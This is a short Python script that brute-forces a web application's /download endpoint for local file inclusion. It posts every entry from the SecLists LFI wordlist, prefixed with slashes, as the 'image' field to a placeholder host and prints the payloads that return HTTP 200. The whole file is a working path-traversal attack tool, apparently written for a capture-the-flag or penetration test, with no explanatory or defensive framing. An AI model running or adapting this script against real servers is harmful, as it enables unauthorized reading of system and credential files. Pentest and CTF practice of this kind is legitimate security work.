import requests

wordlist_path = "/usr/share/seclists/Fuzzing/LFI/allcombined.txt"

proxies = { 'http' : 'http://127.0.0.1:8080' }



with open(wordlist_path, mode="r") as file:
    data = file.readlines()

burp0_url = "http://url:80/download"
burp0_headers = {
    "User-Agent": "curl/7.87.0",
    "Accept": "*/*",
    "Content-Type": "application/x-www-form-urlencoded",
    "Connection": "close",
}

for line in data:
    burp0_data = {"image": str("/////////") + line.rstrip()}
    response = requests.post(burp0_url, headers=burp0_headers, data=burp0_data, allow_redirects=False)
    if response.status_code == 200:
        print(line.rstrip())
